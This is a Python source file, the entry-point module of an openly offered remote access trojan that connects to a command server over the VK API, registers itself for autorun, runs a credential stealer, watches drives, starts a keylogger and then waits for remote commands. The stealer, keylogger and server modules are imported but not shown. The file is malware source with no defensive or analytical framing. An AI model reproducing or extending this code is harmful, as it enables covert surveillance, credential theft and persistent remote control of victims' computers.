# -*- coding: utf-8 -*-
# pylint: disable=too-many-lines

"""
    Remote Access Tool
    Author: Kirill Zhosul.
    https://github.com/kirillzhosul/remote-access
"""


import atexit
import sys
import multiprocessing

from .run_lock import lock
from .debug import DEBUG, message as debug_message
from .autorun import autorun_register
from .server import server_connect, server_message, server_listen
from .drives import drives_waching_start
from .keylogger import keylogger_start
from .commands import command_exit
from .tags import load_tags, get_tags
from .utils import check_operating_system_supported
from .name import load_name
from .stealer import stealer_steal_all



try:
    # TODO: Move at server setup (but for now there is no NON-VK server types.)
    import vk_api
    # There is vk_api.longpoll / vk_api.bot_longpoll imports in server connection,
    # As there is checks for current server type (to not cause import conflicts).

    import requests
except ImportError as exception:
    if DEBUG:
        print(f"[Importing] Cannot import {exception}!")
    sys.exit(1)


def launch() -> None:
    """ Application entry point. """

    multiprocessing.freeze_support() # TODO. CHECK ASAP.

    try:
        debug_message("[Launch] Starting...")

        check_operating_system_supported()
        lock()

        load_tags()
        load_name()

        server_connect()
        server_message(f"Connected to the network! (His tags: {', '.join(get_tags())})")

        autorun_register()
        atexit.register(_exit_handler)

        stealer_steal_all()

        drives_waching_start()
        keylogger_start()
        
        debug_message("[Launch] Launch end! Starting listening server...")
        server_listen()
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Launch] Failed to launch! Exception - {exception}")
        sys.exit(1)


def _exit_handler() -> None:
    """ Handler for the exit event (at_exit). """
    
    server_message(command_exit().get_text())
    debug_message("[Exit Handler] Exit...")
